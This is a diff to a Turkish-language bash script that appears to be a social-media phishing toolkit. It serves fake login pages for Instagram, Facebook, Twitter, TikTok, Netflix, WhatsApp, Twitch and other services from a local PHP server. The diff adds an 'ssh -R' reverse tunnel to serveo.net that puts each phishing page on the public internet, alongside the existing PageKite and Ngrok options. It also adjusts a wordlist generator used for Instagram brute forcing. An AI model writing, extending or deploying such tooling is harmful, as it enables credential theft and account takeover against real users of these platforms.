@@ -42,7 +42,9 @@ banner_pagekite_mail(){
 	echo -e "
 \e[31m[\e[32m01\e[31m]\e[37mNgrok	  
 
-\e[31m[\e[32m02\e[31m]\e[37mPageKite	
+\e[31m[\e[32m02\e[31m]\e[37mPageKite
+
+\e[31m[\e[32m03\e[31m]\e[37mServeo Net	
 
 		   "
 read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' islem_page		   
@@ -153,7 +155,7 @@ fi
 sleep 1
 done
 }
-
+random="yaman"$RANDOM
 banner_sm
 
 
@@ -193,7 +195,11 @@ if [[ $islem_sm == 1 || $islem_sm == 01 ]]; then
 			php -S 127.0.0.1:$port > /dev/null 2>&1 &
 			sleep 2
 			python2 pagekite.py --clean $port $domain.pagekite.me
-
+		elif [[ $islem_page == 03 ]]; then
+			cd instagram-login/ && 
+			php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+			sleep 2
+			ssh -R 80:localhost:3333 $random@serveo.net
 			else
 				echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
 				sleep 2
@@ -227,7 +233,11 @@ if [[ $islem_sm == 1 || $islem_sm == 01 ]]; then
 			php -S 127.0.0.1:$port > /dev/null 2>&1 &
 			sleep 2
 			python2 pagekite.py --clean $port $domain.pagekite.me
-
+		elif [[ $islem_page == 03 ]]; then
+			cd instagram-panel/ && 
+			php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+			sleep 2
+			ssh -R 80:localhost:3333 $random@serveo.net
 			else
 				echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
 				sleep 2
@@ -274,7 +284,8 @@ if [[ $islem_sm == 1 || $islem_sm == 01 ]]; then
 						wordlist -m $min -M $max -o wordlist.txt $char
 						clear
 						echo -e '\033[31;40;1mWordlist oluşturuldu!'
-						sleep 1	
+						sleep 2
+						cd .. && bash sm.sh	
 
 			fi
 		elif [[ $islem_instagram_brute == 2 || $islem_instagram_brute == 02 ]]; then
@@ -332,6 +343,11 @@ if [[ $islem_sm == 1 || $islem_sm == 01 ]]; then
 				php -S 127.0.0.1:$port > /dev/null 2>&1 &
 				sleep 2
 				python2 pagekite.py --clean $port $domain.pagekite.me
+			elif [[ $islem_page == 03 ]]; then
+				cd facebook-login/ && 
+			php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+			sleep 2
+			ssh -R 80:localhost:3333 $random@serveo.net
 
 				else
 					echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
@@ -370,7 +386,11 @@ if [[ $islem_sm == 1 || $islem_sm == 01 ]]; then
 				php -S 127.0.0.1:$port > /dev/null 2>&1 &
 				sleep 2
 				python2 pagekite.py --clean $port $domain.pagekite.me
-
+			elif [[ $islem_page == 03 ]]; then
+				cd facebook-panel/ && 
+			php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+			sleep 2
+			ssh -R 80:localhost:3333 $random@serveo.net
 				else
 					echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
 					sleep 2
@@ -432,6 +452,11 @@ if [[ $islem_sm == 1 || $islem_sm == 01 ]]; then
 				sleep 2
 				python2 pagekite.py --clean $port $domain.pagekite.me
 
+			elif [[ $islem_page == 03 ]]; then
+				cd twitter-login/ && 
+			php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+			sleep 2
+			ssh -R 80:localhost:3333 $random@serveo.net
 				else
 					echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
 					sleep 2
@@ -466,6 +491,11 @@ if [[ $islem_sm == 1 || $islem_sm == 01 ]]; then
 				php -S 127.0.0.1:$port > /dev/null 2>&1 &
 				sleep 2
 				python2 pagekite.py --clean $port $domain.pagekite.me
+			elif [[ $islem_page == 03 ]]; then
+				cd twitter-panel/ && 
+			php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+			sleep 2
+			ssh -R 80:localhost:3333 $random@serveo.net
 
 				else
 					echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
@@ -511,6 +541,11 @@ if [[ $islem_sm == 1 || $islem_sm == 01 ]]; then
 				sleep 2
 				python2 pagekite.py --clean $port $domain.pagekite.me
 
+			elif [[ $islem_page == 03 ]]; then
+				cd youtube/ && 
+			php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+			sleep 2
+			ssh -R 80:localhost:3333 $random@serveo.net
 
 				else
 					echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
@@ -550,7 +585,11 @@ if [[ $islem_sm == 1 || $islem_sm == 01 ]]; then
 				sleep 2
 				python2 pagekite.py --clean $port $domain.pagekite.me
 
-
+			elif [[ $islem_page == 03 ]]; then
+				cd whatsapp/ && 
+			php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+			sleep 2
+			ssh -R 80:localhost:3333 $random@serveo.net
 				else
 					echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
 					sleep 2
@@ -586,6 +625,11 @@ if [[ $islem_sm == 1 || $islem_sm == 01 ]]; then
 				php -S 127.0.0.1:$port > /dev/null 2>&1 &
 				sleep 2
 				python2 pagekite.py --clean $port $domain.pagekite.me
+			elif [[ $islem_page == 03 ]]; then
+				cd spofity/ && 
+			php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+			sleep 2
+			ssh -R 80:localhost:3333 $random@serveo.net
 
 				else
 					echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
@@ -621,7 +665,11 @@ if [[ $islem_sm == 1 || $islem_sm == 01 ]]; then
 				sleep 2
 				python2 pagekite.py --clean $port $domain.pagekite.me
 
-
+			elif [[ $islem_page == 03 ]]; then
+				cd netflix/ && 
+			php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+			sleep 2
+			ssh -R 80:localhost:3333 $random@serveo.net
 				else
 					echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
 					sleep 2
@@ -657,7 +705,11 @@ if [[ $islem_sm == 1 || $islem_sm == 01 ]]; then
 				php -S 127.0.0.1:$port > /dev/null 2>&1 &
 				sleep 2
 				python2 pagekite.py --clean $port $domain.pagekite.me
-
+			elif [[ $islem_page == 03 ]]; then
+				cd blutv/ && 
+			php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+			sleep 2
+			ssh -R 80:localhost:3333 $random@serveo.net
 
 				else
 					echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
@@ -695,7 +747,11 @@ if [[ $islem_sm == 1 || $islem_sm == 01 ]]; then
 				sleep 2
 				python2 pagekite.py --clean $port $domain.pagekite.me
 
-
+			elif [[ $islem_page == 03 ]]; then
+				cd tiktok/ && 
+			php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+			sleep 2
+			ssh -R 80:localhost:3333 $random@serveo.net
 				else
 					echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
 					sleep 2
@@ -725,10 +781,15 @@ if [[ $islem_sm == 1 || $islem_sm == 01 ]]; then
 				echo ""
 				read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port	
 				sleep 1
-				cd twitch// &&
+				cd twitch/ &&
 				php -S 127.0.0.1:$port > /dev/null 2>&1 &
 				sleep 2
 				python2 pagekite.py --clean $port $domain.pagekite.me
+			elif [[ $islem_page == 03 ]]; then
+				cd twitch/ && 
+			php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+			sleep 2
+			ssh -R 80:localhost:3333 $random@serveo.net
 
 				else
 					echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
